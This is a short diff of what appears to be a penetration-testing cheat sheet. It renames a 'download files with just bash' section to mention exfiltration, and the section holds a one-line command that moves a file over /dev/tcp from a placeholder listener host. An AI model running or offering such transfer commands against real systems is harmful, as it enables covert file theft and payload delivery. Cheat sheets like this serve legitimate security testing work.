@@ -64,7 +64,7 @@ hostname -I
     -i, --ip-address       addresses for the host name
     -I, --all-ip-addresses all addresses for the host
 
-# download files with just bash
+# download files with just bash ## exfiltrate files bash pipe tcp
 ```bash
 bash -c "cat < /dev/tcp/$LHOST/$LPORT" > filename
 ```
